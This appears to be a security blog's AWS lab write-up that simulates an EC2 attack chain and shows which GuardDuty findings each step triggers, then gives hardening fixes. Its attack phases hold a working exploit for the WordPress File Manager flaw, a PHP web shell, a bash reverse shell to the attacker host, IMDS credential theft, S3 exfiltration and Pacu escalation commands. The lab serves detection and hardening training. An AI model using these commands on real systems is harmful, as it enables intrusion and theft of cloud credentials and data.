---
layout: post
title: "Lab — EC2 Attack Chain: Reverse Shell, IMDS Credential Theft, and GuardDuty Detection"
date: 2026-06-20T10:00:00
categories:
  - AWS Security Labs
  - GuardDuty lab
tags:
  - aws
  - guardduty
  - ec2
  - pentest
  - imds
  - privilege-escalation
  - s3
  - cloud-attack
  - lab
author: muhammed
description: A hands-on lab simulating a full EC2 attack chain — WordPress exploitation, reverse shell, IMDS credential theft, S3 exfiltration, and IAM privilege escalation — all observed through GuardDuty findings in real time.
toc: true
pin: false
math: false
mermaid: false
image:
---

## Objective

Simulate a realistic cloud attack chain from initial access to privilege escalation inside your own AWS lab account.
Observe every step through GuardDuty findings and understand exactly what triggers each alert.

**This lab must only be run in an account you own and control.**
Never run these techniques against infrastructure you do not have explicit written permission to test.

---

## What You Will Learn

- How attackers pivot from a vulnerable web application to full AWS account access
- How the EC2 Instance Metadata Service (IMDS) exposes IAM credentials
- Which GuardDuty finding fires at each stage of the attack
- How to harden against each technique after observing it

---

## Attack Chain Overview

```
Attacker (Kali Linux EC2)
    │
    │  Step 1: Exploit WordPress RCE vulnerability
    ▼
Victim EC2 (WordPress, intentionally vulnerable)
    │
    │  Step 2: Reverse shell callback to attacker
    │  Step 3: Query IMDS → steal IAM role credentials
    ▼
Attacker uses stolen credentials externally
    │
    │  Step 4: Enumerate and exfiltrate S3 buckets
    │  Step 5: Escalate privileges via IAM misconfig
    ▼
Full account compromise — GuardDuty fires throughout
```

---

## Prerequisites

- An AWS account you fully own (use a dedicated lab/sandbox account, not production)
- Basic Linux command line familiarity
- GuardDuty enabled before you start
- Budget: this lab uses 2 EC2 instances (t3.micro) — expect under $2 if you terminate promptly

---

## Lab Architecture

```
VPC: 10.0.0.0/16
├── Public Subnet: 10.0.1.0/24
│   ├── Attacker EC2 (Kali Linux) — 10.0.1.10
│   └── Victim EC2 (WordPress)   — 10.0.1.20
└── S3 Bucket (target for exfiltration)
```

Both instances in the same public subnet to keep networking simple.
In a real attack, the attacker would be external — but this lets you focus on the technique.

---

## Phase 0 — Setup

### Step 0.1 — Enable GuardDuty

Do this first so it captures every event from the beginning.

```bash
aws guardduty create-detector \
  --enable \
  --finding-publishing-frequency FIFTEEN_MINUTES \
  --region eu-west-1
```

> 📸 **SCREENSHOT:** GuardDuty console → Detectors → showing detector enabled with status Active

---

### Step 0.2 — Create a Test S3 Bucket with Fake Sensitive Data

```bash
# Create the bucket
aws s3 mb s3://lab-target-bucket-$(aws sts get-caller-identity --query Account --output text) \
  --region eu-west-1

# Upload fake sensitive files
echo "server=prod-db.internal user=admin password=SuperSecret123" > db-creds.txt
echo "employee_id,name,salary\n1001,Alice,95000\n1002,Bob,87000" > hr-data.csv
echo "card_number,cvv,expiry\n4111111111111111,123,12/27" > payment-data.txt

aws s3 cp db-creds.txt s3://lab-target-bucket-ACCOUNTID/
aws s3 cp hr-data.csv s3://lab-target-bucket-ACCOUNTID/
aws s3 cp payment-data.txt s3://lab-target-bucket-ACCOUNTID/
```

> 📸 **SCREENSHOT:** `aws s3 ls s3://lab-target-bucket-ACCOUNTID/` showing the 3 files uploaded

---

### Step 0.3 — Create an Overprivileged IAM Role for the Victim EC2

This simulates a real-world misconfiguration — the WordPress server has way more permissions than it needs.

```bash
# Trust policy — EC2 can assume this role
cat > trust-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Service": "ec2.amazonaws.com"},
    "Action": "sts:AssumeRole"
  }]
}
EOF

# Create the role
aws iam create-role \
  --role-name wordpress-ec2-role \
  --assume-role-policy-document file://trust-policy.json

# Attach overprivileged policies (simulating a lazy admin)
aws iam attach-role-policy \
  --role-name wordpress-ec2-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess

aws iam attach-role-policy \
  --role-name wordpress-ec2-role \
  --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess

# Create instance profile
aws iam create-instance-profile \
  --instance-profile-name wordpress-ec2-profile

aws iam add-role-to-instance-profile \
  --instance-profile-name wordpress-ec2-profile \
  --role-name wordpress-ec2-role
```

> 📸 **SCREENSHOT:** IAM console → Roles → wordpress-ec2-role showing both attached policies

---

### Step 0.4 — Launch the Victim EC2 (WordPress)

Use an old WordPress AMI or deploy WordPress on Amazon Linux 2 with a vulnerable plugin.
For this lab, deploy WordPress with the **File Manager** plugin (CVE-2020-25213 — unauthenticated RCE).

```bash
# Launch victim EC2 with the overprivileged role attached
aws ec2 run-instances \
  --image-id ami-0c02fb55956c7d316 \
  --instance-type t3.micro \
  --iam-instance-profile Name=wordpress-ec2-profile \
  --security-group-ids sg-VICTIM \
  --subnet-id subnet-PUBLIC \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=victim-wordpress}]' \
  --user-data '#!/bin/bash
    yum update -y
    yum install -y httpd php php-mysqlnd
    systemctl start httpd
    # Install WordPress and vulnerable File Manager plugin
    cd /var/www/html
    wget https://wordpress.org/wordpress-5.4.tar.gz
    tar -xzf wordpress-5.4.tar.gz
    cp -r wordpress/* .
    # File Manager plugin version 6.8 (vulnerable)
    # Download and install manually in lab setup
  '
```

Security group for victim — allows HTTP from anywhere, SSH from your IP only:

```
Inbound:  80/tcp   0.0.0.0/0   (WordPress)
Inbound:  22/tcp   YOUR_IP/32  (admin access)
Outbound: ALL      0.0.0.0/0   (needed for reverse shell callback)
```

> 📸 **SCREENSHOT:** EC2 console showing both instances running — victim-wordpress and attacker-kali

---

### Step 0.5 — Launch the Attacker EC2 (Kali Linux)

```bash
# Kali Linux is available in AWS Marketplace
# Use the official Kali Linux AMI
aws ec2 run-instances \
  --image-id ami-KALI-AMI-ID \
  --instance-type t3.micro \
  --key-name your-lab-keypair \
  --security-group-ids sg-ATTACKER \
  --subnet-id subnet-PUBLIC \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=attacker-kali}]'
```

Security group for attacker — allows inbound on the reverse shell port:

```
Inbound:  4444/tcp  0.0.0.0/0   (reverse shell listener)
Inbound:  22/tcp    YOUR_IP/32  (SSH to manage Kali)
Outbound: ALL       0.0.0.0/0
```

SSH into Kali to begin the attack:

```bash
ssh -i lab-keypair.pem kali@KALI_PUBLIC_IP
```

---

## Phase 1 — Initial Access: WordPress RCE

### Step 1.1 — Confirm the Vulnerable Plugin

Navigate to `http://VICTIM_IP/wp-admin/plugins.php` and confirm **File Manager 6.8** is installed and active.

The vulnerability (CVE-2020-25213) allows unauthenticated file upload through the plugin's connector endpoint — no login required.

> 📸 **SCREENSHOT:** WordPress admin panel showing File Manager plugin version 6.8 active

### Step 1.2 — Upload a PHP Web Shell

From Kali, create a minimal PHP web shell:

```bash
# Create the web shell payload
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Upload it via the vulnerable File Manager endpoint (unauthenticated)
curl -s -X POST \
  "http://VICTIM_IP/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
  -F "cmd=upload" \
  -F "target=l1_Lw" \
  -F "upload[]=@shell.php;type=image/jpeg"
```

Test RCE — the victim server runs your command:

```bash
curl "http://VICTIM_IP/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
# Returns: uid=48(apache) gid=48(apache) groups=48(apache)
```

> 📸 **SCREENSHOT:** Terminal showing the curl response with `uid=48(apache)` — confirming RCE

---

## Phase 2 — Reverse Shell

### Step 2.1 — Start the Listener on Kali

```bash
# On Kali attacker EC2
nc -lvnp 4444
```

> 📸 **SCREENSHOT:** Terminal showing `listening on [any] 4444 ...`

### Step 2.2 — Trigger the Reverse Shell

```bash
# URL-encode a bash reverse shell and send it via the web shell
PAYLOAD='bash+-i+>%26+/dev/tcp/KALI_PRIVATE_IP/4444+0>%261'
curl "http://VICTIM_IP/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=$PAYLOAD"
```

Back on the Kali listener terminal, you now have an interactive shell on the victim:

```
connect to [KALI_IP] from (UNKNOWN) [VICTIM_IP] 54231
bash: no job control in this shell
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.2$
```

Upgrade to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

> 📸 **SCREENSHOT:** Kali terminal showing the reverse shell connection received with the victim's shell prompt

**GuardDuty finding at this stage:**
If Kali's IP is in a known threat intelligence list, GuardDuty fires:
`Backdoor:EC2/C&CActivity.B!DNS` or `UnauthorizedAccess:EC2/MaliciousIPCaller`

---

## Phase 3 — IMDS Credential Theft

This is the most impactful step.
The EC2 Instance Metadata Service (IMDS) is reachable only from inside the instance at `169.254.169.254`.
Since the victim has an IAM role attached, its temporary credentials are exposed there.

### Step 3.1 — Query the Metadata Service

```bash
# From inside the victim's shell (via reverse shell)

# Check what role is attached
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Output: wordpress-ec2-role

# Retrieve the actual credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/wordpress-ec2-role
```

Output:

```json
{
  "Code" : "Success",
  "LastUpdated" : "2026-06-20T08:15:32Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "AQoDYXdzEJr...(long session token)...",
  "Expiration" : "2026-06-20T14:32:11Z"
}
```

> 📸 **SCREENSHOT:** The curl output showing the JSON with AccessKeyId, SecretAccessKey, and Token — highlight that these are real temporary AWS credentials

### Step 3.2 — Export Credentials on Kali

Copy the credentials out and configure them on the attacker machine:

```bash
# On Kali — set the stolen credentials as environment variables
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AQoDYXdzEJr...

# Confirm who we are now
aws sts get-caller-identity
```

Output:

```json
{
  "UserId": "AROAIOSFODNN7EXAMPLE:i-0abcdef1234567890",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/wordpress-ec2-role/i-0abcdef1234567890"
}
```

The attacker is now authenticated as the WordPress EC2 role — from their own Kali machine outside the victim instance.

> 📸 **SCREENSHOT:** `aws sts get-caller-identity` output on Kali showing the stolen role identity

**GuardDuty finding — this is the most important one:**

```
UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
```

GuardDuty detects that credentials issued to EC2 instance `i-0abc...` are being used from an IP address that is NOT that instance.
This is one of GuardDuty's highest-confidence findings — almost always a real incident.

> 📸 **SCREENSHOT:** GuardDuty console showing the InstanceCredentialExfiltration finding with High severity

---

## Phase 4 — S3 Enumeration and Exfiltration

Using the stolen credentials from Kali:

### Step 4.1 — List All Buckets

```bash
aws s3 ls
```

Output:

```
2026-06-15 10:22:11 lab-target-bucket-123456789012
2026-06-01 08:14:30 company-logs-bucket
2026-06-10 14:55:02 terraform-state-bucket
```

### Step 4.2 — Enumerate Bucket Contents

```bash
aws s3 ls s3://lab-target-bucket-123456789012 --recursive
```

Output:

```
2026-06-20 09:01:14        52 db-creds.txt
2026-06-20 09:01:14       128 hr-data.csv
2026-06-20 09:01:14        55 payment-data.txt
```

### Step 4.3 — Exfiltrate

```bash
# Download all files
aws s3 sync s3://lab-target-bucket-123456789012 ./exfil/

# Read the credentials file
cat exfil/db-creds.txt
# server=prod-db.internal user=admin password=SuperSecret123
```

> 📸 **SCREENSHOT:** Terminal showing the sync command completing and the contents of db-creds.txt

**GuardDuty findings:**

```
Discovery:S3/BucketEnumeration.Unusual
Exfiltration:S3/ObjectRead.Unusual
```

> 📸 **SCREENSHOT:** GuardDuty console showing the S3 exfiltration finding

---

## Phase 5 — Privilege Escalation via IAM Misconfiguration

The wordpress-ec2-role has `IAMReadOnlyAccess` — so the attacker can enumerate all IAM users, roles, and policies to find a path to more access.

### Step 5.1 — Enumerate IAM

```bash
# List all IAM users
aws iam list-users --output table

# List all IAM roles
aws iam list-roles --output table

# Find roles with high privilege
aws iam list-attached-role-policies --role-name admin-role

# Find users with access keys (potential pivot targets)
aws iam list-access-keys --user-name admin-user
```

### Step 5.2 — Exploit if S3FullAccess Includes Terraform State

If a Terraform state bucket exists, it often contains plaintext secrets and resource configs:

```bash
# Download Terraform state
aws s3 cp s3://terraform-state-bucket/prod/terraform.tfstate .

# State files often contain resource IDs, ARNs, and sometimes plaintext secrets
cat terraform.tfstate | python3 -m json.tool | grep -i "password\|secret\|key"
```

> 📸 **SCREENSHOT:** Terraform state file contents with sensitive values highlighted

### Step 5.3 — Use Pacu for Structured Escalation

**Pacu** is an open-source AWS exploitation framework — the cloud equivalent of Metasploit:

```bash
# Install Pacu on Kali
pip3 install pacu

# Start Pacu
pacu

# Import the stolen credentials
set_keys
# Enter AccessKeyId, SecretAccessKey, SessionToken when prompted

# Enumerate all permissions
run iam__enum_permissions

# Scan for privilege escalation paths
run iam__privesc_scan

# Enumerate all S3 buckets
run s3__enum_buckets

# Check for publicly exposed resources
run ebs__enum_snapshots_unauth
```

> 📸 **SCREENSHOT:** Pacu console showing `iam__privesc_scan` output listing escalation paths found

**GuardDuty findings at this stage:**

```
PrivilegeEscalation:IAMUser/AnomalousBehavior
Discovery:IAMUser/AnomalousBehavior
```

---

## Phase 6 — Review All GuardDuty Findings

Now look at everything GuardDuty captured during the lab:

```bash
# Get all findings from this session
aws guardduty list-findings \
  --detector-id YOUR_DETECTOR_ID \
  --finding-criteria '{
    "Criterion": {
      "updatedAt": {
        "Gt": 1718870400
      }
    }
  }'

# Get finding details
aws guardduty get-findings \
  --detector-id YOUR_DETECTOR_ID \
  --finding-ids FINDING_ID_1 FINDING_ID_2
```

Expected findings summary:

| Attack Step | GuardDuty Finding | Severity |
|-------------|-------------------|----------|
| Reverse shell callback | `Backdoor:EC2/C&CActivity.B` | High |
| IMDS theft used externally | `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` | High |
| S3 bucket listing | `Discovery:S3/BucketEnumeration.Unusual` | Medium |
| S3 data download | `Exfiltration:S3/ObjectRead.Unusual` | High |
| IAM enumeration | `Discovery:IAMUser/AnomalousBehavior` | Medium |
| Privilege escalation attempt | `PrivilegeEscalation:IAMUser/AnomalousBehavior` | High |

> 📸 **SCREENSHOT:** GuardDuty Findings console showing all findings from this lab with severity levels

---

## Hardening — Fix Every Attack Vector

### Fix 1 — Enforce IMDSv2 (Blocks IMDS Credential Theft)

IMDSv2 requires a session token to query the metadata service — a simple `curl` no longer works.

```bash
# Enforce IMDSv2 on an existing instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-VICTIM \
  --http-tokens required \
  --http-put-response-hop-limit 1

# For new instances via launch template
aws ec2 create-launch-template-version \
  --launch-template-id lt-abc123 \
  --launch-template-data '{
    "MetadataOptions": {
      "HttpTokens": "required",
      "HttpPutResponseHopLimit": 1
    }
  }'
```

With IMDSv2, the attacker would need to first get a token:
```bash
# IMDSv2 requires a PUT request first
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The hop limit of 1 means the token cannot be retrieved from inside a container or via SSRF — only directly on the host.

> 📸 **SCREENSHOT:** EC2 console → Instance → Actions → Modify instance metadata options showing HttpTokens: required

---

### Fix 2 — Apply Least Privilege to the EC2 Role

The WordPress server only needed to read from one specific S3 path — not `S3FullAccess`:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject"],
    "Resource": "arn:aws:s3:::wordpress-media-bucket/uploads/*"
  }]
}
```

Remove `IAMReadOnlyAccess` entirely — a web server has no business reading IAM.

---

### Fix 3 — Restrict Outbound Traffic (Blocks Reverse Shell)

The reverse shell worked because the victim EC2 had unrestricted outbound access.
Add a NACL or security group rule to restrict outbound to only what the app needs:

```
Outbound allow: 443/tcp  0.0.0.0/0   (HTTPS for WordPress updates)
Outbound allow: 3306/tcp 10.0.2.0/24 (MySQL in private subnet)
Outbound deny:  ALL      0.0.0.0/0   (block everything else)
```

---

### Fix 4 — Enable S3 Block Public Access and Bucket Policies

```bash
# Block all public access at account level
aws s3control put-public-access-block \
  --account-id 123456789012 \
  --public-access-block-configuration \
    BlockPublicAcls=true,\
    IgnorePublicAcls=true,\
    BlockPublicPolicy=true,\
    RestrictPublicBuckets=true

# Enforce HTTPS only on the bucket
aws s3api put-bucket-policy \
  --bucket lab-target-bucket-123456789012 \
  --policy '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::lab-target-bucket-123456789012",
        "arn:aws:s3:::lab-target-bucket-123456789012/*"
      ],
      "Condition": {"Bool": {"aws:SecureTransport": "false"}}
    }]
  }'
```

---

### Fix 5 — GuardDuty Automated Response via EventBridge

Don't just alert — automatically respond when the credential exfiltration finding fires:

```json
{
  "source": ["aws.guardduty"],
  "detail-type": ["GuardDuty Finding"],
  "detail": {
    "type": ["UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS"]
  }
}
```

EventBridge target: Lambda function that:
1. Revokes the session — attaches a deny-all inline policy to the role
2. Notifies the security team via SNS
3. Snapshots the EC2 instance for forensics
4. Tags the instance as `Quarantine: true`

---

## Cleanup

**Important — terminate everything after the lab to avoid charges:**

```bash
# Terminate both EC2 instances
aws ec2 terminate-instances --instance-ids i-VICTIM i-ATTACKER

# Delete the test S3 bucket
aws s3 rm s3://lab-target-bucket-ACCOUNTID --recursive
aws s3 rb s3://lab-target-bucket-ACCOUNTID

# Detach and delete the IAM role
aws iam remove-role-from-instance-profile \
  --instance-profile-name wordpress-ec2-profile \
  --role-name wordpress-ec2-role

aws iam detach-role-policy \
  --role-name wordpress-ec2-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess

aws iam detach-role-policy \
  --role-name wordpress-ec2-role \
  --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess

aws iam delete-instance-profile --instance-profile-name wordpress-ec2-profile
aws iam delete-role --role-name wordpress-ec2-role

# Disable GuardDuty if you don't need it running
aws guardduty delete-detector --detector-id YOUR_DETECTOR_ID
```

---

## Key Takeaways

- **IMDS is the crown jewel** — any RCE on an EC2 with an IAM role attached immediately gives the attacker AWS credentials
- **IMDSv2 is the single most important hardening step** — it breaks this entire attack chain at step 3
- **GuardDuty's credential exfiltration finding is extremely reliable** — it fires when instance credentials are used from outside AWS or from a different IP than the instance
- **Least privilege is the second line of defense** — even if credentials are stolen, a tightly scoped role limits what the attacker can do with them
- **Outbound traffic restrictions are underused** — most teams lock down inbound but ignore outbound, which is what reverse shells rely on

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
